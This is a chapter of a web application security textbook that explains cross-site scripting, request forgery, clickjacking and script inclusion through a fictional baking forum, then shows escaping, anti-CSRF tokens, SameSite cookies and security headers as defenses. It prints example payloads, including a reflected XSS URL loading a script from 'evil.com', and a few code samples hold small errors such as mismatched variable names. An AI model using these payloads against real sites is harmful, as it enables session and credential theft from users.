# 6 Browser vulnerabilities

### In this chapter

- How to protect against cross-site scripting
- How to protect against cross-site request forgery
- How to stop your website from being used in a clickjacking attack
- How to prevent cross-site script inclusion vulnerabilities

[](/book/grokking-web-application-security/chapter-6/)Security-wise, the internet has been a huge mistake. Before we decided to plug all the world’s computers into one giant network, it used to take true ingenuity to spread malicious software. To be infected by a computer virus, you had to insert a floppy disk or connect to a company network that was already infected.

Nowadays, devices are so keen to connect to the internet that computers with no network interfaces are novelties. Such air-gapped devices are sometimes used for highly secure military or life-critical systems. (Here’s a fun aside: when forensic investigators seize computers as part of an investigation, they immediately put them in Faraday bags, which are lined with aluminum foil to prevent them from making wireless connections.)

Given the always-connected status of most computing devices, today’s operating systems are designed to be cautious about what code they execute. They tend to refuse incoming networking connections from untrusted sources, making it quite difficult for an attacker to gain direct access to a computer.

One piece of software wantonly runs code from untrusted sources whenever it’s presented with scripts: the humble web browser. Because users use web apps for pretty much everything nowadays, securing the browser is essential. As we saw in chapter 2, the browser security model puts a lot of limitations on what JavaScript can do to prevent harm to the user’s computer. Internet users perform a lot of sensitive actions with browsers, however, such as making credit card payments, viewing medical and financial data, signing legal documents, and trying (and failing) to cancel their meal-kit subscription service because the website is misleadingly designed.

As such, the browser is a common attack vector for hackers looking to cause trouble on the internet. Browser attacks are generally attacks on your users, rather than direct attacks on anything on your server. But if you fail to protect your users, they won’t stick around for long.

With those facts in mind, let’s look at our first category of browser vulnerabilities, in which an attacker attempts to inject malicious JavaScript into the browser of somebody viewing your website.

## Cross-site scripting

[](/book/grokking-web-application-security/chapter-6/)Browser-based attacks can be roughly divided into two types: those that take advantage of vulnerabilities on an existing website and those in which an attacker tricks users into visiting a site that’s under the attacker’s control. The former type is generally more fruitful for an attacker because most internet users are savvy enough not to share sensitive data with fishy-looking websites that ask for their credit card details. (Browser vendors and email services do an effective job of highlighting potentially harmful sites, too.)[](/book/grokking-web-application-security/chapter-6/)

One way to attack users on a website they trust is to inject malicious JavaScript into the site via a *cross-site scripting* attack, for which the security community has given us the acronym *XSS*. (The *X* is a cross, as in pedestrian Xing.) This technique is commonly used to steal confidential information from a site the user trusts. Let’s look at a concrete example.

### Stored cross-site scripting

Suppose that you run a popular baking forum on the internet, `breddit.com`, where bakers come to swap recipes and upload photos of their newest baking attempts. The forum has a comments section, of course. A user adds a comment, the comment gets saved to the database, and then other users view the comment thread. These comment threads are *dynamic content* because they are generated by users and loaded from a database at run time.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

[](/book/grokking-web-application-security/chapter-6/)Suppose further that a hacker wants to cause harm to the baking community. Maybe this person is angry about their recent gluten-intolerance diagnosis, or maybe their mother was assassinated by a baguette, or . . . who knows? That user, a hacker whom we’ll call Mr. Crunch, writes a comment containing some malicious JavaScript enclosed in a `<script>` tag.

This malicious comment is stored in the database and displayed to other users. Unless the site implements protection against XSS attacks, the `<script>` tag will be written into the HTML of the web page of anyone who views that particular page, and that script will be executed in the victim’s browser. The unfortunate victim in this scenario is Clovis, a sentient loaf of bread.

This scenario is an example of a *stored* XSS attack because the malicious JavaScript is stored in your database. This type of attack is the most vicious form because the malicious script will be executed by anyone who views the page; potentially, it has many victims.

##### What’s the worst that could happen?

[](/book/grokking-web-application-security/chapter-6/)Our example is pretty silly because a rude message displayed in a dialog box is one of the less unpleasant uses of XSS. Following are some more serious consequences of XSS:

-  *Theft of credentials*—If your login page exhibits an XSS vulnerability, an attacker can steal usernames and passwords as people log in.
-  *Session hijacking*—If your sessions are accessible via JavaScript, an attacker can steal session IDs or session cookies to impersonate other users.
-  *Credit card skimming*—Anything that a user types in a text box, including credit card details, can be stolen by malicious JavaScript.

### Reflected cross-site scripting

XSS attacks work because dynamic content from an untrusted source is insecurely combined with the HTML markup of the website itself. In a *stored* XSS attack, the dynamic content comes from a database. In a *reflected* XSS attack, the malicious content comes from the HTTP request itself.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

Suppose that your baking forum has a search function that allows users to browse recipes by keyword. Such a function takes a keyword sent in an HTTP request, runs it against a search index, and displays the results. The function also displays the search term on the results page in some form.

This vector is another one in which dynamic content is combined into the HTML of the page, creating an opportunity for an attacker to inject malicious JavaScript. An attacker could generate a URL containing a malicious script in place of this search term:

```
https://www.breddit.com/search/<script>
 alert('Your%20dough%20is%20tough%20and%20chewy')</script>
```

If the website is vulnerable to XSS, anyone who visits this URL will have the `<script>` tag written to the HTML of the web page, and the script will be executed. The attacker might even hide the malicious link in the comments section itself to trick the victim.

You might well ask a couple of questions at this point: how much malicious JavaScript can be crammed into a URL, and why would anyone click such a suspicious-looking URL? The answer to the first question is “Quite a lot.” Browsers generally respect URLs up to 2,000 characters long. More pertinently, malicious scripts injected via XSS often import a whole other script from a remote source to achieve their effect, so the malicious script tag doesn’t need much space:

```
https://www.breddit.com/search/<script src="evil.com/hack.js">
```

As for tricking users into visiting a suspicious URL, that part is fairly easy. The attacker can use character encodings to disguise the malicious script, or they can use any website that redirects to a user-controlled endpoint—such as a URL-shortening service—to redirect to a malicious URL.

Reflected XSS vulnerabilities are less vicious than stored XSS vulnerabilities because they require each victim to click a malicious link rather than stumble across a particular page on your website. These attacks are often overlooked in code reviews, however, because they appear in less obvious places. Be sure to check any pages that display part of the HTTP request to the user; search pages and error pages commonly exhibit this vulnerability.

### DOM-based cross-site scripting

[](/book/grokking-web-application-security/chapter-6/)One other means of launching XSS attacks uses particular parts of a URL. Recall that a URL has the following parts:[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

The final (optional) part of the URL after the pound sign (`#`) is the *URI fragment*. You will often see URI fragments used in links to particular sections of a web page. The following URL links to the “In Culture” section of the Wikipedia page about pierogies:

```
https://en.wikipedia.org/wiki/Pierogi#In_culture
```

[](/book/grokking-web-application-security/chapter-6/)When you click this link, the browser renders the web page and then scrolls down to the “In Culture” heading, where you learn that Saint Hyacinth is the patron saint of pierogies and that “Saint Hyacinth and his pierogi!” is an expression of surprise in the Polish language.

An interesting fact about URI fragments is that they are available only to the browser. If you click a URL with a fragment, the browser reads the full URL but strips off the trailing fragment before passing the request to the server.

Implementation-wise, this process makes sense because the intent of URI fragments is to allow intrapage linking. The browser says, “Just send me the whole HTML page” and then searches for a tag with an `id` attribute with the value `in_culture`:

```
<span class="mw-headline" id="In_culture">In culture</span>
```

URI fragments, however, can also be read (and written) by JavaScript in the browser. Websites that do a lot of client-side rendering often take advantage of that fact. You sometimes see websites that implement an infinitely scrolling timeline modifying the URI fragment as you scroll down the page.

If the value stored in the URI fragment is also written to the HTML of the page, an attacker has another vector through which they can launch an XSS attack.

This type of attack is called a *DOM-based* XSS attack. (Recall from chapter 2 that *DOM* is the Document Object Model, the in-memory model of the HTML that the browser builds when rendering the page.) DOM-based XSS attacks are particularly nasty because they are not detectable from your server logs; the URI fragment will not even be sent to the web server.

### Protecting against cross-site scripting by using escaping

[](/book/grokking-web-application-security/chapter-6/)To protect your users against XSS attacks, any code that interpolates untrusted content into HTML should remove any control characters that are meaningful to HTML. The code should direct the browser to render dynamic content as text between HTML tags rather than instruct the browser to create new tags when the content is rendered. This process is *escaping*, which is discussed in chapter 4. Safe replacements for HTML control characters are the following escape sequences.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

Modern web frameworks usually escape dynamic content by default because of the frequency and severity of XSS attacks. The templating language that comes with the Flask web server in Python, for example, allows you to interpolate a series of dynamic variables by using the following syntax:[](/book/grokking-web-application-security/chapter-6/)

```
<div id="comments">
  {% for comment in comments %}
    <div class="comment">{{ comment }}</div>
  {% endfor %}
</div>
```

If the comment contains malicious input, as prescribed in our initial example,

```
comment = "<script>alert('Your croissants are limp and sad')</script>"
```

it will be harmlessly rendered in the HTML page:

```
<div id="comments">
 <div class="comment">
   &lt;script&gt;alert('Your croissants are limp and sad')&lt;/script&gt;
 </div>
</div>
```

This code defangs the attack, ensuring that malicious JavaScript doesn’t run because it is no longer contained in a `<script>` tag.

Because frameworks tend to escape dynamic content by default, scanning your codebase for XSS vulnerabilities tends to come down looking for templates where escaping has been turned off. To use the Flask templating language again as an example, you can disable the escaping of dynamic content by using the `autoescape` keyword:[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

```json
{% autoescape false %}
  <div id="comments">
    {% for comment in comments %}
      <div class="comment">{{ comment }}</div>
    {% endfor %}
  </div>
{% endautoescape %}
```

You need to be explicit about why you are using this keyword, if you ever do. This command tells the template engine to incorporate the dynamic content as is (that is, to interpret it as “raw” HTML content), creating new tags as necessary. You might use the `autoescape false` option if you are building a *content management system* (CMS), for example, to allow nontechnical users to generate static websites via an online editor. In such cases, you need to ensure that you aren’t inadvertently creating an XSS vulnerability; you have to perform escaping in your code before you insert the content into the HTML.[](/book/grokking-web-application-security/chapter-6/)

One technique is to use the same underlying libraries used by your web server. In the preceding Python code snippet, under the hood, Flask uses a library called `werkzeug` to escape HTML. You can use a similar approach in your code:[](/book/grokking-web-application-security/chapter-6/)

```
from werkzeug.utils import escape

untrusted_input = 
 "<script>alert('Your croissants are limp and sad')</script>"
safe_html = escape(untrusted)
```

### Escaping in client-side templating

Client-side JavaScript frameworks such as React and Angular also need to be careful not to permit XSS vulnerabilities. In React, you have to go out of your way to accidentally write code that permits XSS. The function to generate tags from untrusted input is amusingly called `dangerouslySetInnerHTML` and is used as follows:[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

```
const App = () => {
 const data = "<script>alert('Your croissants are limp and sad')</script>";
 return (
 
   <div
     dangerouslySetInnerHTML={{__html: data}}
   />
 );
}
```

### Content security policies

[](/book/grokking-web-application-security/chapter-6/)You may recall from chapter 2 that you can tell the browser where it is permitted to load JavaScript from by setting a `Content-Security-Policy` header in your web application. This content security policy (CSP) severely limits an attacker’s ability to launch XSS attacks. You should escape dynamic content in your templates as a first course of action, but setting a CSP too is a helpful way to provide defense in depth.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

The following CSP, when set as a header in the HTTP response, states that any JavaScript to be run on the web page can be loaded only from the `breddit.com` domain:

```
Content-Security-Policy: default-src 'self'; script-src breddit.com
```

The policy also tells the browser to load only images and media (such as video) from the `breddit.com` domain, too. (Different types of resources can be controlled separately by means of the `img-src` and `media-src` attributes. If you don’t care much about where images or video are loaded from, replace `default-src 'self'` with `default-src *`).[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

This policy also tells the browser to never execute *inline* JavaScript—that is, JavaScript code written in the HTML of the page rather than imported via a `src` attribute. The example attacks in this chapter use inline JavaScript snippets, and such a CSP would prevent the malicious JavaScript from being run:

```
<div id="comments">
  <div class="comment">
    <script>
      alert('Your croissants are limp and sad')
    </script>                                             #1
  </div>
</div>
```

To permit inline JavaScript with a CSP, you need to tell the browser explicitly that you are doing something unsafe by adding the `'unsafe-inline'` attribute:[](/book/grokking-web-application-security/chapter-6/)

```
Content-Security-Policy: default-src 'self'; 
  script-src breddit.com 'unsafe-inline'
```

Banning all inline JavaScript is a powerful tool for fighting XSS. If the only JavaScript you permit to be run on your web pages must be hosted as a specific domain, an attacker has to gain access to the server behind that domain itself before launching an XSS attack. (But if an attacker has access to your web server, you probably have bigger problems.)

## Cross-site request forgery

Cross-site scripting is all about injecting malicious JavaScript into a web page to perform an act of mischief. Sometimes, attackers attempt to trick your users into performing what could be considered legitimate actions on your website by means of deception. *Likejacking*, for example, is the act of tricking users into liking a post on a social media site. Liking a post (by clicking the Like button) is an everyday action on Facebook, but obtaining likes by deception is a form of hacking.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

The practice of tricking a user into performing an action they do not expect is called *cross-site request forgery* (CSRF). This vulnerability has a few moving parts, so it’s worthwhile to look at a concrete example.

Returning to our baking forum, Mr. Crunch has discovered a CSRF vulnerability and plans to take advantage of it. He noticed that the form used to add comments uses the HTTP verb `GET`:

```
<form action="/comment/new" method="get">
 <textarea name="comment" 
           placeholder="What's going on?"></textarea>
 <button type="submit">Submit</button>
</form>
```

As a result, a user can be tricked into writing a comment simply by clicking a link with the following format:

```
www.breddit.com/comment/new?comment=Comment+goes+here
```

Mr. Crunch starts his mischief by posting an innocuous-looking comment.

[](/book/grokking-web-application-security/chapter-6/)The link in this comment is to a URL-shortening service that redirects back to the baking forum at the same URL used to generate the original comment.

In effect, clicking the link in the comment will cause the user to add the same comment in the baking forum, which in turn will cause others to click the comment and hence repost it themselves.

This type of self-replicating comment is called a *worm*, a nuisance that has affected many social media sites in the past. (The tragedy in this case is that nobody ever gets to see the secret recipe for upside-down muffins.)

##### What’s the worst that could happen?

Having a worm on your site is a spectacular failure to protect against CSRF, but it is not the most dangerous effect that CSRF could have. Think of the most sensitive actions you perform on websites, such as making payments and bank transfers, signing up for services, deleting your accounts, and sharing personal information. If any of these actions can be triggered by a CSRF attack, your users are in serious trouble.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

### Making your GET requests free of side effects

The major security oversight in our baking forum that permitted the CSRF vulnerability is that comments were created using a `GET` request. Using `GET` requests this way violates the principles of Representational State Transfer (REST), reviewed in chapter 4, which states that `GET` requests should be used only to retrieve resources from the server, never to change state. (In other words, your `GET` requests should not have any side effects.)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

When the baking forum switches to using `POST` requests for generating comments, it becomes much, much harder for an attacker to mount CSRF attacks. `GET` requests can be triggered by clicking a link, but other types of requests need a more elaborate setup. Suddenly, an attacker has to trick a user into filling out and submitting a form (or running some malicious JavaScript) before the user can be tricked into creating a comment.

### Anti-CSRF tokens

Hackers are persistent, however, and even if they need to use `POST` requests to launch a CSRF attack, they will try to do so. Mr. Crunch could accomplish this task by setting up a malicious website that sends a cross-domain `POST` request to the comment-creation URL and tricking users into submitting the form.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

It would be nice if there were a way to ensure that HTML form submissions originated from your website, not from someone else’s (potentially malicious) website. There *is* a standard way, as it turns out: using anti-CSRF tokens.

In the traditional way of implementing *anti-CSRF tokens,* every form on your website includes a `<hidden>` form field containing a randomly generated token:[](/book/grokking-web-application-security/chapter-6/)

```
<form method="post" action="/comment">
 <input type="hidden"
        name="csrf_token"
        value="3c1a48bf80874a59" />
</form>
```

Then this same token is set as a cookie in the HTTP response:

```
Set-Cookie: csrf_token=3c1a48bf80874a5
```

These tokens should be generated each time the user visits the page so that they can’t be guessed. Some implementations store the token in the user’s session rather than in a separate cookie. The important concept is that the token can be traced back to a particular user and is kept somewhere apart from the HTML of the page.[](/book/grokking-web-application-security/chapter-6/)

When the server receives a `POST` request from a form, it can cross-check the token value from the form (which will be in the body of the request) and the token value from the cookie (which will be in the `Cookie` header of the request).

Only forms on your website will be able to supply the anti-CSRF token in both the request body and the cookie. An attacker attempting to generate a malicious form on their website won’t know what value was generated to put in the cookie (or stored in the session) because the browser does not permit a website on another domain to access that information. Hence, your website can reject as potentially malicious any requests that have no matching values.

[](/book/grokking-web-application-security/chapter-6/)Using cookies to protect against CSRF attacks is such a common technique that it is built into most modern frameworks. When you use the Flask web server in Python, for example, adding CSRF protection is as simple as wrapping your app in the `CSRFProtect` app, as follows,

```
from flask import Flask
from flask_wtf.csrf import CsrfProtect

csrf = CsrfProtect()

def create_app():
   app = Flask(__name__)
   csrf.init_app(app)
```

and then modifying any HTML forms you have to include a (dynamically generated) CSRF token:

```
<form method="post" action="/">
  <input type="hidden"
         name="csrf_token"
         value="{{ csrf_token() }}" />
</form>
```

This approach works for HTTP requests generated from JavaScript calls, too. In this scenario, the anti-CSRF token is passed in an HTTP request header, and any requests missing this token will be rejected. As an example, the following JavaScript code expects to find the CSRF token in the `<meta>` tag of the HTML of a web page and then configures it to be sent with any AJAX requests:

```javascript
var csrftoken = $('meta[name=csrf-token]').attr('content')
$.ajaxSetup({
 beforeSend: function(xhr, settings) {
   xhr.setRequestHeader("X-CSRFToken", csrftoken)
 }
})
```

Note that the naming conventions used for the cookies, form fields, and request headers will vary depending on which language or framework you are using. Be sure to familiarize yourself with how antiforgery tokens are implemented in your framework of choice.

### Ensuring that your cookies are sent with the SameSite attribute

You should take one final precaution to protect your users from CSRF attacks. Ensure that your cookies have the `SameSite` attribute added:[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

```
Set-Cookie: session_id=2308797c-348a-4939-9049; SameSite=Lax
```

This attribute tells the browser to strip cookies out of requests coming from other domains to your site, providing an extra layer of protection that finally and completely closes the door on CSRF attacks. It’s worth adding this attribute to all sensitive cookies, including anti-CSRF cookies and session cookies. When you add the `SameSite` attribute to your cookies, cross-domain requests will arrive without cookies, allowing you to disregard them.

[](/book/grokking-web-application-security/chapter-6/)The `Lax` attribute value in this example tells the browser not to strip cookies from `GET` requests. If you used the alternative value, `Strict`, session cookies would be stripped when users clicked a link to your site, requiring them to log in again—which can be quite an annoyance. This effect may not be a consideration if you are running, say, a banking site, where `SameSite=Strict` would be preferred.

Theoretically, stripping cookies from cross-domain requests negates the need to use anti-CSRF tokens. But—and it’s an important *but*—with this approach, you are relying on the browser to implement the CSP correctly, so implementing *both* protections is more secure.

## Clickjacking

You may have noticed that many of the vulnerabilities in this chapter involve tricking users into clicking a malicious link. The reason is that many actions on a web page, such as triggering navigation to another page or opening a new browser window, need to be executed in the context of a user’s doing something. Browser vendors learned the hard way in the early 2000s that pop-ups are annoying, so certain actions can no longer be triggered by background JavaScript. Instead, they’re said to be “gated by user activation“ ([http://mng.bz/yZEJ](http://mng.bz/yZEJ)).[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

Because user clicks are valuable resources, hackers have inevitably found a way to steal them. *Clickjacking* is a type of attack in which a user thinks they are clicking one web page but the browser is tricked into registering the action on another page.

This effect is achieved by using an `<iframe>` tag, which allows one web page to be embedded inside another—even if the two pages are on different domains. If you did much web browsing in the early 2000s, you may recognize iframes, used for navigation. Nowadays, iframes tend to be used for embedding third-party content in a website, such as the invasive ads that tend to clutter local news sites.[](/book/grokking-web-application-security/chapter-6/)

In a clickjacking attack, the content the user wants to interact with is loaded into an iframe, which is itself hosted on a malicious site.

Then the malicious site renders an invisible layer across the `iframe` to intercept clicks. Generally, this invisible layer is a `<div>` tag with opacity set to `0` using styling rules.[](/book/grokking-web-application-security/chapter-6/)

By setting the z-index property in the styling rules, the `<div>` is logically above the iframe in the layout of the page. (Page elements in the DOM have three-dimensional positions: the x coordinate is the left-right direction, y is the up-down direction, and z is the under-over direction.) Any attempt to click the embedded content will be received by the `<div>`, allowing the attacker to steal the click and perform a malicious action.[](/book/grokking-web-application-security/chapter-6/)

Clickjacking isn’t a common threat nowadays, but combined with browser vulnerabilities, it can become pretty nasty. In the past, clickjacking was used to artificially boost click rates in digital advertising *(ad fraud)* and to trick victims into downloading malware—or even turning on their webcams while viewing malicious sites. As a result, it’s important to prevent these things from happening to your users.

### Protecting against clickjacking

When protecting against clickjacking attacks, you are concerned with your website’s being the bait content of the `iframe`. Thus, you typically want to prevent your website from being hosted in a frame. You can tell the browser that your site should never appear in a frame by using a CSP:[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

```
Content-Security-Policy: frame-ancestors 'none'
```

A slightly more permissive form of this CSP allows a website to frame itself

```
Content-Security-Policy: frame-ancestors 'self'
```

or to be framed only by a specific set of other websites:

```
Content-Security-Policy: frame-ancestors 'self' 
  'safewebsite.com' 'anothertrustedsite.com'
```

If any site not listed in the CSP attempts to frame your site, the browser simply won’t permit it.

### X-Frame-Options

Some older websites protect against clickjacking by using the `X-Frame-Options` response header. This header achieves the same end as a CSP with a `frame-ancestors` directive but is an older (obsolete) web standard.[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

You tell the browser that your site should never appear in a frame by using the `X-Frame-Options` response header as follows:

```
X-Frame-Options: DENY
```

The `DENY` keyword may be replaced by the `SAMEORIGIN` keyword (similar to the `frame-ancestors 'self'` directive) or the `ALLOW-FROM` keyword followed by a URI.

## Cross-site script inclusion

We need to look at one final browser-based vulnerability before finishing the chapter, and this vulnerability is one that’s frequently overlooked. By importing your JavaScript files into their own malicious website, an attacker can potentially scrape sensitive credentials from users who are tricked into visiting their site. This kind of attack is called *cross-site script inclusion* (XSSI).[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

XSSI vulnerabilities stem from the fact that JavaScript files are not subject to the same-origin policy in browsers in the same way that other types of content (such as JSON and HTML) are. Cross-domain imports of JavaScript files are permitted (and common) on the internet, so any JavaScript files on your website need to be scrubbed of sensitive details.

Any website on the internet can import your generated JavaScript files, which means that an attacker can build their own malicious site and import your JavaScript code with a `<script>`tag. Then the attacker will be able to harvest the sensitive details from your JavaScript for any victim who visits their malicious site.

Let’s go back to our baking forum to make this concept concrete. The site includes a third-party chat application that requires the generation of an access token for each user.

Anyone with an access token can participate in breadchat, and if an attacker steals this token, they can act as that user. Consider what happens if the token is written directly in the JavaScript file of the baking forum:

```
window.addEventListener("load", (event) => {
  chatbox.init({
    client_id         : "BREDDIT.COM",
    version           : "1.3.1",
    user_access_token : "clovis-394688478521"   #1
  });
};
```

[](/book/grokking-web-application-security/chapter-6/)Mr. Crunch imports this script file into his malicious website:

```
<script src="https://breddit.com/chat.js">
```

Then he can harvest the access tokens of anyone who visits the malicious site and start impersonating them.

The crux of the security problem is that the JavaScript file will have a different access token depending on which user is viewing the page; it’s generated dynamically and stored in the session. But because JavaScript can be imported across domains easily, these access tokens get leaked.

### Protecting against XSSI

JavaScript files should not contain sensitive, user-specific credentials. If your JavaScript code needs to load access tokens or credentials for the current user, you have two safe ways to do this. One option is to make an asynchronous call to the server and load it via a JSON response:[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

```
fetch('https://breddit.com/api/chat/token')
 .then(response => response.json())
 .then(data => {
   // The access token is generated on the server,
   // and can be used to initialize the chat plugin.
   var access_token = data.access_token;
   chatbox.init({
     client_id         : "BREDDIT.COM",
     version           : "1.3.1",
     user_access_token : token
   });
 });
```

Alternatively, you can embed the sensitive token in the HTML of the page itself as

```
<head>
 <meta name="access-token" content="clovis-394688478521">
</head>
```

and then retrieve it in JavaScript code by using a DOM query:

```
var token = document.head.querySelector(
 'meta[name="access-token"]').content;
chatbox.init({
 client_id         : "BREDDIT.COM",
 version           : "1.3.1",
 user_access_token : token
});
```

Either of these approaches will prevent the leaking of sensitive tokens because the JSON and HTML contents are protected by the same-origin policy.

### Setting a cross-origin resource policy

If your website hosts resources that shouldn’t be loaded on other domains, you can control which domains are allowed to access a particular resource by setting a *cross-origin resource policy* (CORP). Any resource with the following response header can be loaded or accessed only by pages on the same domain:[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)[](/book/grokking-web-application-security/chapter-6/)

```
Cross-Origin-Resource-Policy: same-origin
```

Adding this header to the requests that host your JavaScript files is an additional way to protect against XSSI. No malicious websites will be allowed to import your JavaScript. This approach won’t be an option, however, if you host JavaScript on a content delivery network in a different domain.

## Summary[](/book/grokking-web-application-security/chapter-6/)

-  Protect your users against XSS attacks by escaping HTML control characters in dynamic content and setting a CSP.
-  Protect your users against CSRF attacks by ensuring that your `GET` requests are free of side effects, using antiforgery tokens, and adding the `SameSite` attribute to sensitive cookies.
-  Protect your users against clickjacking attacks by implementing a CSP with the `frame-ancestors` attribute to control how your website can appear in an `<iframe>` tag.
-  Protect your users against XSSI attacks by ensuring that JavaScript files contain no sensitive security credentials. Consider adding a CORP to your JavaScript files.
